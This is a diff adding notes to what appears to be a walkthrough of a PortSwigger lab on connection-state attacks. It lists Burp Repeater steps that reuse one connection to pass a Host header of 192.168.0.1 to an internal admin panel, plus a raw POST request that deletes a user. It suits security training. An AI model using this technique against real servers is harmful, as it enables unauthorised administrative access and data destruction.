@@ -225,14 +225,23 @@ Hint: Solving this lab requires features first released in Burp Suite 2022.8.1.
 This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#state). 
 ```
 
-- 
+- send the `GET /` to repeater
+- change the path to `/admin` and the host header to `192.168.0.1`
+- send the request and see that you are simply redirected to the homepage
+- duplicate the tab then add both tabs to a new group in repeater
+- select the first tab and make the following adjustments, change back to `/` and host header back to the lab domain
+- using drop down menu next and select the send to `send group in sequence (single connection)`
+- change the connection header to `keep-alive`
+- send sequence and check the responses, observe that the second request has successfully accessed the admin panel
+- study the response and observe the admin panel contains and HTML form for deleting a given user, change the second tab request to this:
 
+```
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.1
+Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
+Content-Type: x-www-form-urlencoded
+Content-Length: CORRECT
 
-
-
-
-
-
-
-
-
+csrf=YOUR-CSRF-TOKEN&username=carlos
+```
+- send the requests in sequence down a single connection to solve the lab
